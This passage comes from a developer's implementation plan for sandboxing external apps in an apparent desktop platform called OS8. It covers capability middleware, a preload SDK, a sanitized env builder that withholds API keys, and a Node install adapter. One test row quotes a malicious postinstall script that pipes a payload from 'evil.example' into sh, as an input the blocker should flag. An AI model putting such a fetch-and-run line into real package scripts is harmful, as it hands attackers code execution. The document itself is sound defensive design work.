| Manifest with `start.shell: true` | static blocker fires; `riskLevel: 'high'`; LLM not called |
| Manifest with `package_manager: pnpm` but only `package-lock.json` in clone | static blocker fires |
| `package.json` with `scripts.postinstall: "curl evil.example/payload.sh \| sh"` | static blocker fires (the curl-pipe-sh in scripts is a critical pattern) |
| LLM returns malformed JSON | parser surfaces `LLMReviewError`; result `riskLevel: 'medium'` with info finding |

### Acceptance criteria

- Cloned worldmonitor passes static checks; LLM review (or mock) produces a low-risk report; `app_install_jobs.review_report` is populated; job transitions to `awaiting_approval`.
- Cloning a manifest with `shell: true` fails review immediately with a critical finding.
- The shared helper is exercised by both `skill-review.js` (existing tests still green) and `app-review.js`.

### Cross-platform notes

- `npm` must be on PATH for `npm audit`. If absent (rare on dev machines, common on minimal Linux containers), audit step degrades to a warning finding instead of blocking.

### Spec deviations

- **Keep `skill-review.js` + add `app-review.js`** instead of renaming to `SecurityReviewService` (spec §6.2.5). Plan §10 decision 1; restated and locked here.
- **Inline review storage on `app_install_jobs.review_report`** instead of a separate `reviews` table (spec §6.5 implies separate). Plan §10 decision 3.

### Depends on

PR 1.5 (cloned files in `staging_dir`), `AnthropicSDK` + `AIRegistryService` + `RoutingService` (existing).

### Open sub-questions

None.

---

## PR 1.7 — `scopedApiMiddleware` (server-side capability enforcement)

**Goal.** External apps load at `<slug>.localhost:8888` — a different browser origin from the OS8 main UI at `localhost:8888`, so cross-origin calls to OS8's `/api/*` are blocked by browser CORS by default. Within an app's own subdomain, the SDK calls relative URLs at `/_os8/api/...` and this middleware authorizes them: resolves the slug from `Host`, parses the requested capability from path + method, checks against `manifest.permissions.os8_capabilities`, injects `X-OS8-App-Id`, rewrites the path, forwards via `next()`.

### Files

- **Create:** `/home/leo/Claude/os8/src/services/scoped-api-surface.js`
- **Tests:** `/home/leo/Claude/os8/tests/scoped-api-surface.test.js`

(Mounted in `src/server.js` in PR 1.15, not here.)

### Capability-resolution table

```
On Host: <slug>.localhost:8888,
path under /_os8/api/...                                 Capability required
────────────────────────────────────────────────         ──────────────────────────────────
GET    /_os8/api/blob/*                                  blob.readonly | blob.readwrite
PUT    /_os8/api/blob/*                                  blob.readwrite
DELETE /_os8/api/blob/*                                  blob.readwrite
GET    /_os8/api/blob (listing)                          blob.readonly | blob.readwrite

POST   /_os8/api/db/query                                db.readonly  | db.readwrite
POST   /_os8/api/db/execute                              db.readwrite

POST   /_os8/api/telegram/send                           telegram.send

*      /_os8/api/imagegen/*                              imagegen
*      /_os8/api/speak/*                                 speak
*      /_os8/api/youtube/*                               youtube
*      /_os8/api/x/*                                     x

GET    /_os8/api/google/calendar/*                       google.calendar.readonly | google.calendar.readwrite
PUT/POST/DELETE /_os8/api/google/calendar/*              google.calendar.readwrite
GET    /_os8/api/google/drive/*                          google.drive.readonly
GET    /_os8/api/google/gmail/*                          google.gmail.readonly

POST   /_os8/api/mcp/<server>/<tool>                     mcp.<server>.<tool>  (with mcp.<server>.* wildcard accepted)
```

### Module shape

```js
// /home/leo/Claude/os8/src/services/scoped-api-surface.js
const yaml = require('js-yaml');
const AppService = require('./app');

const SUBDOMAIN_HOST_RE = /^([a-z][a-z0-9-]{1,39})\.localhost(?::\d+)?$/;
const SCOPED_PATH_RE    = /^\/_os8\/api(\/.*)?$/;

function resolveCapability(apiPath, method) {
  // apiPath is the part after /_os8/api — starts with '/' or empty.
  const p = apiPath || '/';

  if (p.startsWith('/blob')) {
    return method === 'GET' ? ['blob.readonly', 'blob.readwrite'] : ['blob.readwrite'];
  }
  if (p === '/db/query'   || p.startsWith('/db/query?'))   return ['db.readonly', 'db.readwrite'];
  if (p === '/db/execute' || p.startsWith('/db/execute?')) return ['db.readwrite'];

  if (p.startsWith('/telegram/send')) return ['telegram.send'];
  if (p.startsWith('/imagegen'))      return ['imagegen'];
  if (p.startsWith('/speak'))         return ['speak'];
  if (p.startsWith('/youtube'))       return ['youtube'];
  if (p.startsWith('/x'))             return ['x'];

  if (p.startsWith('/google/calendar')) {
    return method === 'GET' ? ['google.calendar.readonly', 'google.calendar.readwrite'] : ['google.calendar.readwrite'];
  }
  if (p.startsWith('/google/drive'))   return ['google.drive.readonly'];
  if (p.startsWith('/google/gmail'))   return ['google.gmail.readonly'];

  // mcp.<server>.<tool>
  const mcpMatch = p.match(/^\/mcp\/([a-z0-9_-]+)\/([a-z0-9_-]+)/);
  if (mcpMatch) {
    const [_, server, tool] = mcpMatch;
    return [`mcp.${server}.${tool}`, `mcp.${server}.*`];   // either-or
  }

  return null;   // unknown path — handled as 404 below
}

function isCapabilityAllowed(required, declared) {
  if (!required || required.length === 0) return false;
  return required.some(r => declared.includes(r));
}

function scopedApiMiddleware(db) {
  return (req, res, next) => {
    // 1. Resolve slug from Host header. If not a <slug>.localhost request, skip.
    const host = (req.headers.host || '').toLowerCase();
    const hostMatch = host.match(SUBDOMAIN_HOST_RE);
    if (!hostMatch) return next();

    // 2. Check this is the scoped API path on the subdomain. If not, leave it
    //    for ReverseProxyService.middleware() to route to the upstream.
    const pathMatch = req.path.match(SCOPED_PATH_RE);
    if (!pathMatch) return next();

    const [, localSlug] = hostMatch;
    const [, apiPath]   = pathMatch;
    const app = AppService.getBySlug(db, localSlug);
    if (!app || app.app_type !== 'external') {
      return res.status(404).json({ error: 'not an external app' });
    }

    const required = resolveCapability(apiPath, req.method);
    if (!required) {
      return res.status(404).json({ error: 'unknown scoped api path', path: apiPath });
    }

    const manifest = yaml.load(app.manifest_yaml || '') || {};
    const declared = manifest.permissions?.os8_capabilities || [];
    if (!isCapabilityAllowed(required, declared)) {
      return res.status(403).json({
        error: 'capability not declared',
        required, declared
      });
    }

    // Inject app context. Internal routes (PR 1.8) read req.callerAppId.
    req.headers['x-os8-app-id'] = app.id;
    req.callerAppId = app.id;

    // Rewrite URL to internal route. blob/db are per-app; others are shared.
    if (apiPath.startsWith('/blob') || apiPath.startsWith('/db')) {
      req.url = `/api/apps/${app.id}${apiPath}`;
    } else {
      req.url = `/api${apiPath}`;
    }
    next();
  };
}

module.exports = { scopedApiMiddleware, resolveCapability, isCapabilityAllowed };
```

**Why per-app rewrite for blob/db only.** `routes/app-blob.js` and `routes/app-db.js` are mounted at `/api/apps/:appId/blob` and `/api/apps/:appId/db` respectively (server.js:421, 424). Other routes like `/api/imagegen`, `/api/speak` are global and handle per-caller context themselves (PR 1.8 plumbs the `req.callerAppId` so they can scope output to the calling app's blob).

**Why two-phase match (Host → path).** Cross-origin requests from external apps to bare `localhost:8888/api/*` are blocked by browser CORS without our cooperation. Same-origin requests on the subdomain (the SDK's relative URLs) hit this middleware. Subdomain-but-non-API paths fall through to `ReverseProxyService.middleware()` which proxies them to the upstream dev server.

### Tests

`/home/leo/Claude/os8/tests/scoped-api-surface.test.js` — pure unit tests on the middleware.

| Setup | Request | Expected |
|---|---|---|
| App `foo` (external, declares `[blob.readonly]`) | `GET /_os8/api/blob/x` with `Host: foo.localhost:8888` | rewritten to `/api/apps/<id>/blob/x`; `req.callerAppId` set |
| Same | `PUT /_os8/api/blob/x` with `Host: foo.localhost:8888` | 403 `{ error: 'capability not declared' }` |
| Same | `GET /_os8/api/blob/x` with `Host: localhost:8888` (no subdomain) | passes through (`next()`) — not our request |
| Same | `GET /vite/foo.js` with `Host: foo.localhost:8888` (app traffic) | passes through to ReverseProxyService |
| App `bar` (regular, not external) | `GET /_os8/api/blob/x` with `Host: bar.localhost:8888` | 404 |
| Unknown slug | `GET /_os8/api/blob/x` with `Host: unknown.localhost:8888` | 404 |
| App `foo` declares `[mcp.tavily.*]` | `POST /_os8/api/mcp/tavily/search` | allowed via wildcard |
| App `foo` declares `[mcp.tavily.search]` | `POST /_os8/api/mcp/tavily/extract` | 403 |

### Acceptance criteria

- Mounted on a test Express, the assertions above pass.
- Native React apps (requests with `Host: localhost:8888`) pass through unchanged via `next()`.

### Cross-platform notes

None — Host-header parsing is platform-agnostic. RFC 6761 `*.localhost` resolution is verified at install time (PR 1.16 pre-flight DNS check) so the middleware doesn't need to handle resolution failures.

### Spec deviations

None — matches spec §6.3.2.

### Depends on

PR 1.1 (`apps.manifest_yaml` column).

### Open sub-questions

None.

---

## PR 1.8 — `requireAppContext` middleware on external-eligible APIs

**Goal.** Routes reachable by external apps inspect `X-OS8-App-Id` (set by PR 1.7's `scopedApiMiddleware`); set `req.callerAppId` for downstream handlers; native shell + native React apps remain trusted (no header set, allowed). Plan §10 Q9 fixes the inventory: 11 routes mount this; 27 stay shell-only.

### Files

- **Create:** `/home/leo/Claude/os8/src/middleware/require-app-context.js`
- **Modify:** the 11 routers below to mount the middleware

### Apply to (11 routes)

`src/routes/app-blob.js`, `src/routes/app-db.js`, `src/routes/imagegen.js`, `src/routes/speak.js`, `src/routes/youtube.js`, `src/routes/x.js`, `src/routes/telegram.js`, `src/routes/google.js`, `src/routes/mcp.js`. (Plus `src/routes/voicemessage.js`, `src/routes/transcribe.js` if external apps need them — flag for review during implementation.)

### Do NOT apply to (27 routes)

`system, apps (CRUD), agents, agent-jobs, agent-chat, assistant, voice, voice-stream, tts-stream, transcribe, speak-stream, call, call-stream, jobs, inspect, plans, vault, tasks, journal, images, connections, oauth, ai-registry, settings, capabilities, buzz, embodiment` — shell + native-app surfaces, trusted code in v1.

### Middleware shape

```js
// /home/leo/Claude/os8/src/middleware/require-app-context.js
function requireAppContext(req, res, next) {
  const headerAppId = req.headers['x-os8-app-id'];
  if (headerAppId) {
    // Set in PR 1.7's scopedApiMiddleware. Trust it because it's set before
    // the request reaches user code.
    req.callerAppId = headerAppId;
  }
  // v1: native shell calls without the header are allowed (trusted code per
  // plan §10 Q1). Tighten when first native app needs per-app scoping.
  next();
}
module.exports = requireAppContext;
```

### Mount example (in `src/routes/imagegen.js`)

```js
const requireAppContext = require('../middleware/require-app-context');

function createImageGenRouter(db, deps) {
  const router = express.Router();
  router.use(requireAppContext);    // ← new line
  // existing routes…
  return router;
}
```

(Mount at the top of the router so it sets `req.callerAppId` before any handler.)

### Tests

`/home/leo/Claude/os8/tests/require-app-context.test.js`:

| Setup | Assertion |
|---|---|
| Request with `X-OS8-App-Id: app-123` | `req.callerAppId === 'app-123'` |
| Request without the header | `req.callerAppId === undefined`; `next()` still called |

### Acceptance criteria

- An external app gated through PR 1.7 reaches `/api/imagegen/*` (rewritten by 1.7) with `req.callerAppId` populated.
- Native shell calls to `/api/imagegen/*` without the header still succeed.
- 11 routers have the middleware mounted; 27 do not.

### Cross-platform notes

None.

### Spec deviations

- **Permissive form in v1** (header-optional). Spec §6.3.2 implies stricter enforcement (`401/403` without the header); plan §11.1 / §10 Q1 deferred tightening. PR 1.8 ships the switch in permissive mode; flipping later is a one-line constant change in the middleware.

### Depends on

PR 1.7.

### Open sub-questions

None.

---

## PR 1.9 — `window.os8` SDK + `preload-external-app.js`

**Goal.** External-app `BrowserView`s load a separate preload that injects a typed `window.os8` SDK. Methods are exposed only when the manifest declares the corresponding capability. Calling an undeclared method either errors locally (the method is missing) or surfaces a structured `403` from the server.

### Files

- **Create:** `/home/leo/Claude/os8/src/preload-external-app.js`
- **Create:** `/home/leo/Claude/os8/src/templates/os8-sdk.d.ts` — TypeScript types shipped into each external app's CLAUDE.md (PR 1.21)
- **Modify:** `/home/leo/Claude/os8/src/ipc/app-store.js` (PR 1.4) — add `app-store:get-manifest-for-preload` handler

### Manifest delivery to the preload

The preload runs in the BrowserView renderer process. It needs the manifest's `permissions.os8_capabilities` to decide which SDK methods to expose. Two options were considered:

- **(a) Encode in the URL** (`?os8_caps=blob.readonly,db.readwrite`) — simple but surfaces in `document.URL`, leaks to the page.
- **(b) IPC handshake on preload init** — preload calls a one-shot `ipcRenderer.invoke('app-store:get-manifest-for-preload', appId)` to fetch the manifest. The appId comes from a query string parameter set by `PreviewService.setUrl` (PR 1.19). This is the chosen path because the BrowserView is loaded by the OS8 main process, which knows the appId.

The URL passed to `BrowserView.loadURL` becomes:

```
http://<slug>.localhost:8888/?__os8_app_id=<appId>
```

(`__os8_app_id` is harmless metadata; the page body never sees it because the SDK initializes from `window.location.search` and removes the param before user code runs.)

### Preload shape

```js
// /home/leo/Claude/os8/src/preload-external-app.js
const { contextBridge, ipcRenderer } = require('electron');

(async () => {
  const params = new URLSearchParams(window.location.search);
  const appId = params.get('__os8_app_id');
  if (!appId) {
    contextBridge.exposeInMainWorld('os8', {});
    return;
  }
  // Strip the app-id param so user code doesn't see it.
  params.delete('__os8_app_id');
  const newSearch = params.toString();
  history.replaceState(null, '', window.location.pathname + (newSearch ? '?' + newSearch : '') + window.location.hash);

  // The page's origin IS the app's subdomain; relative URLs are exactly right.
  const apiBase = '/_os8/api';

  // Fetch the manifest's declared caps via IPC.
  const { ok, capabilities = [] } = await ipcRenderer.invoke(
    'app-store:get-manifest-for-preload', appId
  );
  if (!ok) {
    contextBridge.exposeInMainWorld('os8', {});
    return;
  }

  const has = (cap) => capabilities.some(c => c === cap || c.endsWith('.*') && cap.startsWith(c.slice(0, -1)));

  function rejectIfNotOk(res) {
    if (!res.ok) {
      const isCapacityErr = res.status === 403;
      return res.json().then(body => {
        const e = new Error(body?.error || `os8 SDK call failed: ${res.status}`);
        e.status = res.status;
        e.body = body;
        throw e;
      });
    }
    return res;
  }

  const sdk = {};

  // Blob
  if (has('blob.readonly') || has('blob.readwrite')) {
    sdk.blob = {
      read:   (key) => fetch(`${apiBase}/blob/${encodeURIComponent(key)}`).then(rejectIfNotOk).then(r => r.blob()),
      list:   (prefix = '') => fetch(`${apiBase}/blob?prefix=${encodeURIComponent(prefix)}`).then(rejectIfNotOk).then(r => r.json()),
    };
    if (has('blob.readwrite')) {
      sdk.blob.write  = (key, data) => fetch(`${apiBase}/blob/${encodeURIComponent(key)}`,
        { method: 'PUT', body: data }).then(rejectIfNotOk);
      sdk.blob.delete = (key) => fetch(`${apiBase}/blob/${encodeURIComponent(key)}`,
        { method: 'DELETE' }).then(rejectIfNotOk);
    }
  }

  // DB
  if (has('db.readonly') || has('db.readwrite')) {
    sdk.db = {
      query: (sql, params = []) => fetch(`${apiBase}/db/query`,
        { method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sql, params }) }).then(rejectIfNotOk).then(r => r.json()),
    };
    if (has('db.readwrite')) {
      sdk.db.execute = (sql, params = []) => fetch(`${apiBase}/db/execute`,
        { method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sql, params }) }).then(rejectIfNotOk).then(r => r.json());
    }
  }

  // Imagegen, speak, youtube, x, telegram, google, mcp — thin wrappers.
  if (has('imagegen'))      sdk.imagegen      = makeWrapper(`${apiBase}/imagegen`);
  if (has('speak'))         sdk.speak         = makeWrapper(`${apiBase}/speak`);
  if (has('youtube'))       sdk.youtube       = makeWrapper(`${apiBase}/youtube`);
  if (has('x'))             sdk.x             = makeWrapper(`${apiBase}/x`);
  if (has('telegram.send')) sdk.telegram      = { send: (body) => fetchPost(`${apiBase}/telegram/send`, body) };
  if (has('google.calendar.readonly') || has('google.calendar.readwrite')) sdk.googleCalendar = makeWrapper(`${apiBase}/google/calendar`);
  if (has('google.drive.readonly')) sdk.googleDrive = makeWrapper(`${apiBase}/google/drive`);
  if (has('google.gmail.readonly')) sdk.googleGmail = makeWrapper(`${apiBase}/google/gmail`);
  if (capabilities.some(c => c.startsWith('mcp.'))) {
    sdk.mcp = (server, tool, body) => fetchPost(`${apiBase}/mcp/${server}/${tool}`, body);
  }

  contextBridge.exposeInMainWorld('os8', Object.freeze(sdk));
})();

function makeWrapper(base) {
  return {
    get:  (path = '', query) => fetch(`${base}${path}${query ? '?' + new URLSearchParams(query) : ''}`).then(r => r.ok ? r.json() : r.json().then(b => Promise.reject(b))),
    post: (path, body) => fetch(`${base}${path}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }).then(r => r.ok ? r.json() : r.json().then(b => Promise.reject(b))),
  };
}
function fetchPost(url, body) {
  return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) })
    .then(r => r.ok ? r.json() : r.json().then(b => Promise.reject(b)));
}
```

### IPC handler

```js
// In src/ipc/app-store.js (extend PR 1.4)
const yaml = require('js-yaml');
const AppService = require('../services/app');

ipcMain.handle('app-store:get-manifest-for-preload', (_e, appId) => {
  const app = AppService.getById(db, appId);
  if (!app || app.app_type !== 'external') return { ok: false };
  const manifest = yaml.load(app.manifest_yaml || '') || {};
  const capabilities = manifest.permissions?.os8_capabilities || [];
  return { ok: true, capabilities };
});
```

### TypeScript types

`src/templates/os8-sdk.d.ts` is a type-only ambient declaration shipped into each external app's folder by PR 1.21. The interface conditionally surfaces methods only when the manifest declares them; types are union-of-conditional. Keep it terse — full type coverage of all wrappers, ~120 lines.

```ts
// Excerpt — full file in PR 1.21.
declare global {
  interface Window {
    os8: {
      blob?: {
        read:  (key: string) => Promise<Blob>;
        list:  (prefix?: string) => Promise<{ keys: string[] }>;
        write?: (key: string, data: Blob | ArrayBuffer) => Promise<void>;
        delete?: (key: string) => Promise<void>;
      };
      db?: {
        query:    (sql: string, params?: unknown[]) => Promise<{ rows: unknown[] }>;
        execute?: (sql: string, params?: unknown[]) => Promise<{ changes: number; lastInsertRowid: number }>;
      };
      // … imagegen, speak, etc.
    };
  }
}
export {};
```

### Tests

`tests/preload-external-app.test.js` — runs the preload module in a JSDOM-like sandbox with a mocked `ipcRenderer.invoke`. Assertions:

| Manifest caps | Assertion on `window.os8` |
|---|---|
| `[]` | `Object.keys(window.os8).length === 0` |
| `['blob.readonly']` | `os8.blob.read` exists; `os8.blob.write` undefined; `os8.db` undefined |
| `['blob.readwrite']` | both `read` and `write` exist |
| `['db.readonly', 'imagegen']` | `os8.db.query` exists; `os8.db.execute` undefined; `os8.imagegen` exists |
| `['mcp.tavily.*']` | `os8.mcp` is a function |

Smoke through the full BrowserView wires in PR 1.19.

### Acceptance criteria

- Loaded into a hardened BrowserView (PR 1.19) with a worldmonitor manifest declaring `[]`, `window.os8` is an empty object.
- For a manifest declaring `['blob.readwrite']`, calling `window.os8.blob.write('foo', new Blob(['bar']))` round-trips through `<slug>.localhost:8888/_os8/api/blob/foo` and writes to `~/os8/blob/<id>/foo`.
- Calling an undeclared method throws a structured error containing `error: 'capability not declared'`.

### Cross-platform notes

None — Electron preload is platform-agnostic.

### Spec deviations

- **TypeScript types ship via auto-generated CLAUDE.md** (PR 1.21), not as an npm package. Plan §10 decision Q7.

### Depends on

PR 1.7 (scoped API), PR 1.4 (IPC scaffolding). PR 1.19 wires it into the BrowserView.

### Open sub-questions

None.

---

## PR 1.10 — `EnvService` per-app overload + sanitized env builder

**Goal.** Extend `EnvService` (currently global only) with optional `appId`. Build the sanitized environment per spec §6.3.1 — whitelisted host vars, OS8-injected vars, manifest `env:`, per-app secrets — in a single helper. **Never `...process.env`.**

### Files

- **Modify:** `/home/leo/Claude/os8/src/services/env.js` — add appId-aware methods (no breaking changes to existing API)
- **Create:** `/home/leo/Claude/os8/src/services/sanitized-env.js`
- **Tests:** `/home/leo/Claude/os8/tests/sanitized-env.test.js`

### `EnvService` extensions

Append to `src/services/env.js` (don't touch the existing 6 methods):

```js
// Per-app methods — opts.appId is required to hit app_env_variables; otherwise
// behave as global (backwards compat).
EnvService.set = function(db, key, value, optsOrDescription = null) {
  // Backwards-compat: third arg may be a string (legacy) or an object.
  let description = null, appId = null;
  if (typeof optsOrDescription === 'string') {
    description = optsOrDescription;
  } else if (optsOrDescription && typeof optsOrDescription === 'object') {
    appId = optsOrDescription.appId || null;
    description = optsOrDescription.description || null;
  }
  if (appId) return EnvService._setForApp(db, appId, key, value, description);
  // existing global path…
  /* current 5 lines preserved */
};

EnvService._setForApp = function(db, appId, key, value, description) {
  const existing = db.prepare(
    'SELECT id FROM app_env_variables WHERE app_id = ? AND key = ?'
  ).get(appId, key);
  if (existing) {
    db.prepare(
      'UPDATE app_env_variables SET value = ?, description = ? WHERE id = ?'
    ).run(value, description, existing.id);
  } else {
    const id = require('../utils').generateId();
    db.prepare(
      'INSERT INTO app_env_variables (id, app_id, key, value, description) VALUES (?, ?, ?, ?, ?)'
    ).run(id, appId, key, value, description);
  }
};

EnvService.getAllForApp = function(db, appId) {
  const rows = db.prepare('SELECT key, value FROM app_env_variables WHERE app_id = ?').all(appId);
  const obj = {};
  rows.forEach(r => { obj[r.key] = r.value; });
  return obj;
};

EnvService.deleteForApp = function(db, appId, key) {
  db.prepare('DELETE FROM app_env_variables WHERE app_id = ? AND key = ?').run(appId, key);
};
```

The `description` column must exist on `app_env_variables` — added by the migration in PR 1.1.

### `sanitized-env.js`

Cross-platform whitelist with Windows / POSIX splits.

```js
const path = require('path');
const os = require('os');
const { APPS_DIR, BLOB_DIR } = require('../config');
const EnvService = require('./env');

// POSIX whitelist (macOS / Linux).
const POSIX_WHITELIST = ['PATH', 'HOME', 'TMPDIR', 'LANG', 'TZ', 'USER', 'LC_ALL', 'LC_CTYPE'];
// Windows whitelist.
const WINDOWS_WHITELIST = ['PATH', 'HOMEDRIVE', 'HOMEPATH', 'USERPROFILE',
                           'TEMP', 'TMP', 'USERNAME', 'COMPUTERNAME',
                           'SYSTEMROOT', 'WINDIR', 'PATHEXT'];

function pickHostEnv() {
  const list = process.platform === 'win32' ? WINDOWS_WHITELIST : POSIX_WHITELIST;
  const out = {};
  for (const k of list) {
    if (process.env[k] !== undefined) out[k] = process.env[k];
  }
  return out;
}

/**
 * Build the env passed to spawn() for an external app process.
 *
 * Merge order (later wins on key collision):
 *   1. Whitelisted host env (PATH, HOME, TMPDIR, …).
 *   2. OS8-injected (OS8_APP_ID, OS8_APP_DIR, OS8_BLOB_DIR, OS8_BASE_URL,
 *      OS8_API_BASE, PORT). NEVER overridden by manifest or secrets.
 *   3. Manifest `env:` array (non-secret defaults).
 *   4. Per-app declared secrets (manifest.permissions.secrets[].name → value
 *      from app_env_variables).
 *
 * Conflict rules:
 *   - Secrets override manifest env on collision (per-app trust > manifest).
 *   - Neither secrets nor manifest env can override OS8-injected keys (the
 *     builder explicitly re-applies them at the end). This prevents an external
 *     app from spoofing OS8_APP_ID by declaring an env entry with the same name.
 */
function buildSanitizedEnv(db, {
  appId, allocatedPort, manifestEnv = [], localSlug, OS8_PORT
}) {
  const hostEnv     = pickHostEnv();
  const manifestObj = Object.fromEntries(manifestEnv.map(e => [e.name, e.value]));
  const secretsObj  = appId ? EnvService.getAllForApp(db, appId) : {};
  const os8Injected = {
    OS8_APP_ID:    appId,
    OS8_APP_DIR:   path.join(APPS_DIR, appId),
    OS8_BLOB_DIR:  path.join(BLOB_DIR, appId),
    OS8_BASE_URL:  `http://localhost:${OS8_PORT}`,
    OS8_API_BASE:  `http://${localSlug}.localhost:${OS8_PORT}/_os8/api`,
    PORT:          String(allocatedPort),
  };

  return {
    ...hostEnv,
    ...manifestObj,
    ...secretsObj,
    ...os8Injected,    // OS8-injected always wins; overrides manifest/secret collisions
  };
}

module.exports = {
  buildSanitizedEnv,
  POSIX_WHITELIST, WINDOWS_WHITELIST,
};
```

**Ordering note vs spec §6.3.1.** The spec writes `{ host, OS8-injected, manifestEnv, secrets }` (later-wins is OS8 secrets, then OS8-injected). I've made OS8-injected unconditionally win the final merge — even over secrets — so a malicious manifest declaring `OS8_APP_ID` as a secret cannot spoof identity. The spec's intent matches this; the spread order is the technical fix.

### Worldmonitor end-to-end env (concrete example)

For `slug='worldmonitor'`, `appId='abc-123'`, `allocatedPort=43217`, `OS8_PORT=8888`, manifest declares one non-secret `VITE_DEV_PORT=5173`, no secrets:

```
PATH=/usr/local/bin:/usr/bin:/bin    (host-whitelisted)
HOME=/home/leo
TMPDIR=/tmp
LANG=en_US.UTF-8
TZ=America/Los_Angeles
USER=leo
LC_ALL=en_US.UTF-8
LC_CTYPE=UTF-8
VITE_DEV_PORT=5173                   (manifest env)
OS8_APP_ID=abc-123                   (OS8-injected, wins)
OS8_APP_DIR=/home/leo/os8/apps/abc-123
OS8_BLOB_DIR=/home/leo/os8/blob/abc-123
OS8_BASE_URL=http://localhost:8888
OS8_API_BASE=http://worldmonitor.localhost:8888/_os8/api
PORT=43217
```

**Critically NOT inherited:** `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GOOGLE_*`, `XAI_API_KEY`, `ELEVENLABS_API_KEY`, `TELEGRAM_BOT_TOKEN`, `OS8_HOME` (the external app should not know its host's data layout), `npm_config_*`, etc. The whitelist is conservative; manifest authors who need additional vars declare them via `env:` (non-secret) or `permissions.secrets` (secret).

### Tests

`tests/sanitized-env.test.js`:

| Setup | Assertion |
|---|---|
| Worldmonitor manifest, no secrets, host has `process.env.ANTHROPIC_API_KEY='sk-…'` | env contains `VITE_DEV_PORT`, `PATH`, `OS8_*`; does NOT contain `ANTHROPIC_API_KEY` |
| Manifest declares secret `NEWS_API_KEY`; app_env_variables row exists | env contains `NEWS_API_KEY=<value>` |
| Manifest declares env `OS8_APP_ID=hacker` (collision attempt) | env's `OS8_APP_ID` equals the real `appId`, NOT 'hacker' |
| Per-app secret named `OS8_APP_DIR` | env's `OS8_APP_DIR` equals the real path, NOT the secret |
| Windows simulation (`process.platform = 'win32'` mock) | env contains `TEMP`, `TMP`, `USERNAME`; lacks `TMPDIR`, `USER` |
| Per-app secret AND manifest env with the same name (e.g. `LOG_LEVEL`) | secret wins |

### Acceptance criteria

- `buildSanitizedEnv(db, { appId, allocatedPort, manifestEnv, localSlug, OS8_PORT })` returns the exact key set above for worldmonitor.
- A spawn launched with this env starts Vite, which reports `Local: http://127.0.0.1:43217/worldmonitor/`.
- Removing all `OS8_*` keys from `process.env` (via test override) doesn't break the build — the function reads from `appId`/args, not from process env.

### Cross-platform notes

Whitelist split documented in code. Windows `USERNAME` vs POSIX `USER` is the most common stumbling block — don't forget.

### Spec deviations

- **Final-merge wins for OS8-injected.** Spec §6.3.1's spread order has OS8-injected before secrets; I've moved OS8-injected to the end so secrets cannot spoof OS8 identity. This is a refinement, not a change in intent.

### Depends on

PR 1.1 (`description` column on `app_env_variables`).

### Open sub-questions

None.


## PR 1.11 — Node runtime adapter (split: 1.11a + 1.11b)

**Goal.** Implement the `RuntimeAdapter` interface (spec §6.2.2) for `runtime.kind: node`. argv-array spawn with `shell: false`. Auto-detect package manager from lockfile. Frozen install. `.env` file generation. Framework defaults. Cross-platform tree-kill.

**Split rationale.** Plan estimates ~500 LOC, exceeding the 400-LOC review limit. Split:

- **1.11a** (~250 LOC): adapter shell + `ensureAvailable` + `detectPackageManager` + `install`. Mergeable independently.
- **1.11b** (~250 LOC): `start` + `stop` + `readiness` + `watchFiles` + `detectVersion`. Depends on 1.11a.

### Files

- **Create:** `/home/leo/Claude/os8/src/services/runtime-adapters/index.js` — interface + registry (PR 1.11a)
- **Create:** `/home/leo/Claude/os8/src/services/runtime-adapters/node.js` — Node adapter (split as above)
- **Modify:** `/home/leo/Claude/os8/package.json` — add `tree-kill@^1.2.2` to `dependencies` (PR 1.11b)

### Adapter interface (`runtime-adapters/index.js`, PR 1.11a)

```js
// Per-kind registry. PR 2.1 adds 'python', 'static'; v1 ships only 'node'.
const adapters = new Map();

function register(adapter) {
  if (!adapter.kind) throw new Error('adapter.kind required');
  adapters.set(adapter.kind, adapter);
}

function getAdapter(kind) {
  const a = adapters.get(kind);
  if (!a) throw new Error(`no runtime adapter for kind=${kind}`);
  return a;
}

register(require('./node'));
module.exports = { register, getAdapter };
```

### Node adapter shape

```js
// /home/leo/Claude/os8/src/services/runtime-adapters/node.js
const fs = require('fs');
const path = require('path');
const { spawn } = require('node:child_process');
const treeKill = require('tree-kill');                              // 1.11b
const hostNodeMajor = parseInt(process.versions.node.split('.')[0], 10);

const NodeRuntimeAdapter = {
  kind: 'node',

  // ── Availability check (1.11a) ─────────────────────────────────
  async ensureAvailable(spec) {
    const declared = parseInt(spec.runtime.version, 10);
    if (Number.isNaN(declared)) throw new Error(`invalid runtime.version=${spec.runtime.version}`);
    if (hostNodeMajor < declared) {
      throw new Error(`host node ${process.versions.node} < declared major ${declared}`);
    }
    try { await runCmd('git', ['--version'], { timeout: 5000 }); }
    catch { throw new Error('git not found on PATH'); }
  },

  // ── Package-manager detection (1.11a) ──────────────────────────
  detectPackageManager(appDir, manifestHint = 'auto') {
    if (manifestHint && manifestHint !== 'auto') return manifestHint;
    // Lockfile precedence (plan §10 Q10): pnpm > yarn > bun > npm.
    for (const [file, pm] of [
      ['pnpm-lock.yaml',    'pnpm'],
      ['yarn.lock',         'yarn'],
      ['bun.lockb',         'bun'],
      ['package-lock.json', 'npm'],
    ]) {
      if (fs.existsSync(path.join(appDir, file))) return pm;
    }
    return 'npm';
  },

  // ── Install (1.11a) ────────────────────────────────────────────
  async install(spec, appDir, sanitizedEnv, onLog) {
    const pm   = this.detectPackageManager(appDir, spec.runtime.package_manager);
    const cmds = this._frozenInstallCmds(pm, appDir, spec);
    this._writeEnvFile(appDir, spec.env || []);
    const runList = [...cmds, ...(spec.install || []), ...(spec.postInstall || [])];
    for (const cmd of runList) await this._spawn(cmd.argv, { cwd: appDir, env: sanitizedEnv, onLog });
  },

  _frozenInstallCmds(pm, appDir, spec) {
    const channel = spec.review?.channel || 'verified';
    const allowScripts =
      channel === 'verified' ||
      (channel === 'community' && spec.allow_package_scripts === true);
    // Developer-import: allowScripts always false.

    const flags = (extra = []) => allowScripts ? extra : [...extra, '--ignore-scripts'];

    switch (pm) {
      case 'npm':  return [{ argv: ['npm', 'ci', ...flags()] }];
      case 'pnpm': return [{ argv: ['pnpm', 'install', '--frozen-lockfile', ...flags()] }];
      case 'yarn': {
        // Yarn berry vs yarn1 (plan §10 decision 7).
        const isBerry = fs.existsSync(path.join(appDir, '.yarnrc.yml'));
